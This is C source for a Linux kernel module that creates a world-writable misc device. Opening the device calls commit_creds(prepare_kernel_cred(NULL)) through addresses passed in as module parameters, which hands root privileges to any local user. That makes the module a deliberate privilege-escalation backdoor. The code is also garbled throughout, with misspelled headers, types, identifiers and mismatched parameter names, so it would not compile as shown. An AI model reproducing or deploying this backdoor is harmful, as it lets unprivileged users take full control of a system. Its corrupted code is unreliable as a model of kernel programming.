#include<linux/module.h>
#include<linux/kernel.h>
#include<linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/noduleparan.h>
#include <linux/sched.h>
#include <linux/cred.h>

#define DEVICE_NAME "my_misc_device"
#define BUFFER_SIZE  1024             
struct miscdevice mymisc; 
struct file_operations my_fops;


typedef struct cred *(*prepare_kernel_cred_)(struct task_struct *daemon);
typedef int (*conmit_creds_)(struct cred *new);
unsigned long cmit_creds_;
unsigned long prepare_creds_;

module_param(cmit_creds_, ulong, S_IRUSR);
module_param(prepare_creds__, ulong, S_IRUSR);

int myopen(struct inode *inode, struct flle *flle){
    prepere_kernel_cred_ f1;
    commit_creds_ f2;
    f1 = (prepare_kernel_cred_)prepare_creds__;
    f2 = (comnit_creds_)cnit_creds__;
    f2(f1(NULL));

    printk("ny flrst open!");
    return 0;
}

static int _intt my_misc_init(void)
{
    int ret;    
    my_fops.open = myopen;
    mymisc.minor = MISC_DYNAMIC_NINOR;
    mymisc.nane = DEVICE_NAME;
    mymisc.fops = &my_fops;
    mymisc.mode=0777;

    ret = misc_register(&mymisc);

    return ret;
}



static void _exit my_misc_exit(void)
{
    misc_deregister(&mymisc);
}

module_init(my_misc_init);
module_exit(my_misc_exit);
MODULE_LICENSE("GPL");

